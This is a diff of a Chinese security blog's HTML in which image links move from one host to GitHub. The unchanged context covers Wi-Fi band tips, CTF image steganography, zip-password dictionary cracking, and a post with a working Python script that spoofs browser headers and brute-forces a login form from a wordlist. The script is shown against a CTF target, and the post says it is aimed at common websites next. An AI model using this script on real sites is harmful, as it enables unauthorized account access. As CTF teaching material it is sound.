 <h2 id="0x04-使用5-0Ghz频段（附）"><a href="#0x04-使用5-0Ghz频段（附）" class="headerlink" title="0x04 使用5.0Ghz频段（附）"></a>0x04 使用5.0Ghz频段（附）</h2><p>5Ghz信号的波长要比2.4Ghz信号的要短，而波长越短的电磁波穿透力就越强。但因为频率越高消耗在穿透上的能量越大，导致信号浪费，设备接受到的反而是反射衍射过来的信号。2.4Ghz下，衍射和反射比5Ghz要多，因此设备接受到的信号反而强。<br>但是5Ghz比2.4Ghz要多出很多空闲的高频段，可以分为23个不重叠的20MHz频段。而且因为目前大部分用户的路由器都工作在2.4Ghz，所以5Ghz是一个很好的选择。<br>这里要注意的一点是，配置5Ghz需要路由器和接收设备的无线网卡都支持5Ghz，否则买到5Ghz的路由器之后，电脑或者手机无法接收也是没有用的。下面教大家几个查看自己电脑是否支持5.0Ghz的方法：  </p>
@@ -1364,7 +1364,7 @@
 <li>2 在网络属性的硬件属性中查看频段。</li>
 <li>3 在cmd中输入netsh wlan show drivers，然后查看其中的支持的无线电类型，如果包含802.11a或802.11ac，则支持5Ghz。如博主的网卡，就不支持5Ghz。  </li>
 </ul>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/wifi/4.png" alt="">   </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/wifi/4.png" alt="">   </p>
 
           
         
@@ -1720,7 +1720,7 @@
         
           
             <h1 id="python爬虫暴力破解网站登陆密码（一）"><a href="#python爬虫暴力破解网站登陆密码（一）" class="headerlink" title="python爬虫暴力破解网站登陆密码（一）"></a>python爬虫暴力破解网站登陆密码（一）</h1><p>本来准备一次写完这篇博客，但是写出主干后发现有很多重要的东西没有提到，所以就分成两篇写，这篇写基础操作，下一篇加上验证码处理和多线程处理模块。  </p>
-<h2 id="0x00-robot-txt"><a href="#0x00-robot-txt" class="headerlink" title="0x00 robot.txt"></a>0x00 robot.txt</h2><p>在写爬虫爬取某个网站之前，我们应该去了解这个网站的robot.txt。那什么是robot.txt呢？简单的说，就是网站的所有者为了让爬虫了解爬取该网站的时候存在哪些限制。虽然这些限制只是建议，但是如果你的爬虫不遵守这些限制，很容易会被网站所封禁。<br>下图为IBM官方网站的robot.txt，我们写爬虫的时候，应该尽量遵守规定。<br><img src="http://oo3iot5oz.bkt.clouddn.com/python/a.png" alt="">  </p>
+<h2 id="0x00-robot-txt"><a href="#0x00-robot-txt" class="headerlink" title="0x00 robot.txt"></a>0x00 robot.txt</h2><p>在写爬虫爬取某个网站之前，我们应该去了解这个网站的robot.txt。那什么是robot.txt呢？简单的说，就是网站的所有者为了让爬虫了解爬取该网站的时候存在哪些限制。虽然这些限制只是建议，但是如果你的爬虫不遵守这些限制，很容易会被网站所封禁。<br>下图为IBM官方网站的robot.txt，我们写爬虫的时候，应该尽量遵守规定。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/a.png" alt="">  </p>
 <p>  下面给出几种写法示例：  </p>
 <ol>
 <li><p>允许所有的robot访问  </p>
@@ -1739,14 +1739,14 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /tmp/</span><br></pre></td></tr></table></figure>
 </li>
 </ol>
-<h2 id="0x01-伪造header"><a href="#0x01-伪造header" class="headerlink" title="0x01 伪造header"></a>0x01 伪造header</h2><p>网站防采集的前提就是要正确地区分人类访问用户和网络机器人，方法之一就是查看你的http请求头，我们为了让自己的爬虫看起来更像是人类用户，就需要对header进行伪造。<br>伪造header成什么样最好呢？当然是伪造成自己手动访问时候的样子最好。这里我们就能用到Firefox中的一个扩展工具——HttpFox（也可以用Chrome开发者模式直接查看），利用这个工具，我们能抓取我们用Firefox访问网站过程的数据包，然后查看这个数据包，就可以看到我们手动访问时的header，然后使用python的requests库进行伪造。<br>  <img src="http://oo3iot5oz.bkt.clouddn.com/python/b.png" alt="">  </p>
+<h2 id="0x01-伪造header"><a href="#0x01-伪造header" class="headerlink" title="0x01 伪造header"></a>0x01 伪造header</h2><p>网站防采集的前提就是要正确地区分人类访问用户和网络机器人，方法之一就是查看你的http请求头，我们为了让自己的爬虫看起来更像是人类用户，就需要对header进行伪造。<br>伪造header成什么样最好呢？当然是伪造成自己手动访问时候的样子最好。这里我们就能用到Firefox中的一个扩展工具——HttpFox（也可以用Chrome开发者模式直接查看），利用这个工具，我们能抓取我们用Firefox访问网站过程的数据包，然后查看这个数据包，就可以看到我们手动访问时的header，然后使用python的requests库进行伪造。<br>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/b.png" alt="">  </p>
 <p>  代码中hea的部分就可以照着上图写成这种格式：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hea = &#123; <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>:<span class="string">'gzip, deflate'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span> : <span class="string">'zh-hk,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line">        <span class="string">'Referer'</span>: <span class="string">'www.baidu.com'</span>,</span><br><span class="line">        <span class="string">'Content-Type'</span>:<span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="0x02-填写data并登陆"><a href="#0x02-填写data并登陆" class="headerlink" title="0x02 填写data并登陆"></a>0x02 填写data并登陆</h2><p>既然要破解登陆密码，那前提肯定要做到登陆，我们手动登陆的时候当然是输入账号，输入密码，然后点击提交。可是爬虫工作时，看到的和我们不一样，这个时候账号密码应该怎么传入、登陆操作该怎么进行呢？这个时候再一次用到了Httpfox（同样可以用Chrome开发者模式直接查看），上次我们手动输入时，传入的数据在Httpfox中也被抓取了，照着他的样子填好data，然后我们使用requests中的post命令传入data获取一个cookie，然后再通过cookies访问下一个网站，就实现了爬虫的登陆。<br><img src="http://oo3iot5oz.bkt.clouddn.com/python/c.png" alt="">  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/python/d.png" alt="">  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/python/e.png" alt=""><br>如这个网站，两种方法都可以看到要传递的数据，那么填写的时候就要写成这种格式：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'j_username'</span>: <span class="string">'xxxxxx'</span>,</span><br><span class="line">	<span class="string">'j_password'</span>: <span class="string">'xxxxxx'</span>,</span><br><span class="line">	<span class="string">'checkCode'</span>: <span class="string">'xxx'</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x02-填写data并登陆"><a href="#0x02-填写data并登陆" class="headerlink" title="0x02 填写data并登陆"></a>0x02 填写data并登陆</h2><p>既然要破解登陆密码，那前提肯定要做到登陆，我们手动登陆的时候当然是输入账号，输入密码，然后点击提交。可是爬虫工作时，看到的和我们不一样，这个时候账号密码应该怎么传入、登陆操作该怎么进行呢？这个时候再一次用到了Httpfox（同样可以用Chrome开发者模式直接查看），上次我们手动输入时，传入的数据在Httpfox中也被抓取了，照着他的样子填好data，然后我们使用requests中的post命令传入data获取一个cookie，然后再通过cookies访问下一个网站，就实现了爬虫的登陆。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/c.png" alt="">  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/d.png" alt="">  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/e.png" alt=""><br>如这个网站，两种方法都可以看到要传递的数据，那么填写的时候就要写成这种格式：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'j_username'</span>: <span class="string">'xxxxxx'</span>,</span><br><span class="line">	<span class="string">'j_password'</span>: <span class="string">'xxxxxx'</span>,</span><br><span class="line">	<span class="string">'checkCode'</span>: <span class="string">'xxx'</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
 <h2 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h2><p>这里用一个ctf环境先做一个小脚本进行测试，这道题密码是五位纯数字，生成字典的方法之前破解压缩包的时候已经讲过不在赘述，代码如下。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line">hea = &#123; <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>:<span class="string">'gzip, deflate'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span> : <span class="string">'zh-hk,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line">        <span class="string">'Referer'</span>: <span class="string">'www.baidu.com'</span>,</span><br><span class="line">        <span class="string">'Content-Type'</span>:<span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line">       &#125;</span><br><span class="line">url=<span class="string">'http://120.24.86.145:8002/baopo/?yes'</span></span><br><span class="line">data = &#123;<span class="string">'pwd'</span>:<span class="number">123</span>&#125;</span><br><span class="line"></span><br><span class="line">content = requests.post(url,data=data,headers=hea)</span><br><span class="line">content.encoding=<span class="string">'utf-8'</span></span><br><span class="line">recv=content.text</span><br><span class="line"></span><br><span class="line">passFile = open(<span class="string">r'C:\Users\Leticia\Desktop\mutou.txt'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> passFile.readlines():</span><br><span class="line">    password = line.strip(<span class="string">'\n'</span>)</span><br><span class="line">    data = &#123;<span class="string">'pwd'</span>:password&#125;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'trying'</span>,password</span><br><span class="line">    content = requests.post(url,data=data)</span><br><span class="line">    content.encoding=<span class="string">'utf-8'</span></span><br><span class="line">    html=content.text</span><br><span class="line">    <span class="keyword">if</span> html != recv:</span><br><span class="line">        <span class="keyword">print</span> html</span><br></pre></td></tr></table></figure>
-<p>结果如下：<br><img src="http://oo3iot5oz.bkt.clouddn.com/python/f.png" alt=""><br><img src="http://oo3iot5oz.bkt.clouddn.com/python/g.png" alt="">  </p>
+<p>结果如下：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/f.png" alt=""><br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/g.png" alt="">  </p>
 <p>这个脚本的雏形就有了，可以爆破出结果，但是还存在速度很慢，遇到验证码无法进行等问题，下一节再加上验证码处理和多线程处理的模块,解决了这几个问题，就可以用来处理常见的网站了。</p>
 
           
@@ -1933,15 +1933,15 @@
 <p>  github项目：<a href="https://github.com/devttys0/binwalk" target="_blank" rel="noopener">https://github.com/devttys0/binwalk</a></p>
 <p>  binwalk的wiki：<a href="https://github.com/devttys0/binwalk/wiki" target="_blank" rel="noopener">https://github.com/devttys0/binwalk/wiki</a></p>
 <h2 id="0x03-类型1"><a href="#0x03-类型1" class="headerlink" title="0x03 类型1"></a>0x03 类型1</h2><p>用载体进行隐藏，查看一下属性，看看里面有没有什么信息，或者直接用notepad++打开，一般ctrl+f查找一下key，flag等信息，如果没找到，可以翻到图片头或者尾部查看是否有特殊的字符串，比如一段md5、base64、unicode之类的，然后到某些网址进行解密。</p>
-<p>通过备注查看：<br><img src="http://oo3iot5oz.bkt.clouddn.com/ctf-yx/1.0.png" alt=""><br>通过notepad++查看：<br>  <img src="http://oo3iot5oz.bkt.clouddn.com/ctf-yx/1.1.png" alt=""><br>在线解密：<br>  <img src="http://oo3iot5oz.bkt.clouddn.com/ctf-yx/1.2.png" alt=""></p>
+<p>通过备注查看：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/1.0.png" alt=""><br>通过notepad++查看：<br>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/1.1.png" alt=""><br>在线解密：<br>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/1.2.png" alt=""></p>
 <h2 id="0x04-类型2"><a href="#0x04-类型2" class="headerlink" title="0x04 类型2"></a>0x04 类型2</h2><p>图片文件会自动忽略结束符之后的数据，比如jpg图片的结束符为FF D9,在这之后加入数据，不会影响jpg的显示，对于类隐写，我们肯定用不能winhex打开16进制数据肉眼去看，这个时候就要用到binwalk了，例子如下，放在linux里，用binwalk xxx.jpg自动跑出来隐藏的信息及其类型。这个时候我们借助winhex设置头和尾然后导出成新文件，或者直接在linux系统中用dd命令，都是可以分割出来后面一段文件的。</p>
-<p>  使用binwalk分析：<br>  <img src="http://oo3iot5oz.bkt.clouddn.com/ctf-yx/2.1.png" alt=""><br>  在linux下用dd命令分离（方法一）：<br>  <img src="http://oo3iot5oz.bkt.clouddn.com/ctf-yx/2.2.png" alt=""><br>  在win下用winhex分离（方法二）：<br>  <img src="http://oo3iot5oz.bkt.clouddn.com/ctf-yx/2.3.png" alt=""><br>  分离出来的结果：<br>  <img src="http://oo3iot5oz.bkt.clouddn.com/ctf-yx/2.4.png" alt=""></p>
+<p>  使用binwalk分析：<br>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/2.1.png" alt=""><br>  在linux下用dd命令分离（方法一）：<br>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/2.2.png" alt=""><br>  在win下用winhex分离（方法二）：<br>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/2.3.png" alt=""><br>  分离出来的结果：<br>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/2.4.png" alt=""></p>
 <h2 id="0x05-类型3"><a href="#0x05-类型3" class="headerlink" title="0x05 类型3"></a>0x05 类型3</h2><p>LSB隐写，也就是最低有效位 (Least Significant Bit)。图片中的像数一般是由三种颜色组成，即三原色，由这三种原色可以组成其他各种颜色，例如在PNG图片的储存中，每个颜色会有8bit，LSB隐写就是修改了像数中的最低的1bit。<br>这里需要注意一个坑，很多时候它会给你一个黑白颜色相反的二维码，直接扫肯定是出不来结果的，需要自己处理一下，最简单的就是放到一个可以编辑的地方ctrl+a一下，然后扫描。</p>
-<p>  <img src="http://oo3iot5oz.bkt.clouddn.com/ctf-yx/3.1.png" alt=""><br>使用Stegsolve发现他在灰色最低位隐藏了一个二维码：<br>  <img src="http://oo3iot5oz.bkt.clouddn.com/ctf-yx/3.2.png" alt=""></p>
+<p>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/3.1.png" alt=""><br>使用Stegsolve发现他在灰色最低位隐藏了一个二维码：<br>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/3.2.png" alt=""></p>
 <h2 id="0x06-类型4"><a href="#0x06-类型4" class="headerlink" title="0x06 类型4"></a>0x06 类型4</h2><p>Gif，这种题喜欢让密码出现的特别快来不及记录，这个时候丢到Stegsolve-frame browser，一帧一帧的看就行了<br>逐帧查看：  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/ctf-yx/4.1.png" alt="">  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/ctf-yx/4.2.png" alt="">  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/ctf-yx/4.3.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/4.1.png" alt="">  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/4.2.png" alt="">  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/4.3.png" alt=""></p>
 <h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>关于图片隐写的还有很多，png格式的文件经常会在一个不完整的版块藏很多数据，这个时候可以用pngcheck分析，有时候会跑出来两张看起来相同的png图片，可以丢到Stegsolve-image combiner中对比，bmp文件经常会在不同图层隐藏信息，photoshop就可以处理。例子中用到的图都放在github中了，有兴趣的朋友可以去试试。</p>
 
           
@@ -2130,15 +2130,15 @@
 </li>
 </ul>
 <h2 id="0x02-制作字典"><a href="#0x02-制作字典" class="headerlink" title="0x02 制作字典"></a>0x02 制作字典</h2><p>首先，我们下载一个名为“木头超级字典工具集”的软件，这里可以生成各种各样类型的字典，可以选择密码包含的字符集以及设定已知的每一位，还有一些特殊的字典。  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/python/01.jpg" alt="">  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/01.jpg" alt="">  </p>
 <p>我在这里创建了一个一到四位的纯数字密码做实验，字典里面也可以随意加入自己想测试的密码，但要注意字典的最后面要空一行。  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/python/02.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/02.png" alt=""></p>
 <h2 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h2><p>我们先添加一个压缩文件，嗯，为了节约时间密码就设置成紫的年龄了。  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/python/03.png" alt="">  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/03.png" alt="">  </p>
 <p>然后在压缩文件和字典的目录按shift+鼠标右键在当前目录打开命令行  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/python/04.jpg" alt="">  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/04.jpg" alt="">  </p>
 <p>然后测试一下，成功得到密码  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/python/05.png" alt="">  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/05.png" alt="">  </p>
 <p>实际上，真正用到暴力破解的时候不多，因为穷举法十分耗费时间，而且现今稍具严密度的密码验证机制都会设下试误的可容许次数以应对使用密码穷举法的破解者。当试误次数达到可容许次数时，密码验证系统会自动拒绝继续验证，有的甚至还会自动启动入侵警报机制。不过在面对弱口令的时候还是十分有效的。</p>
 
           
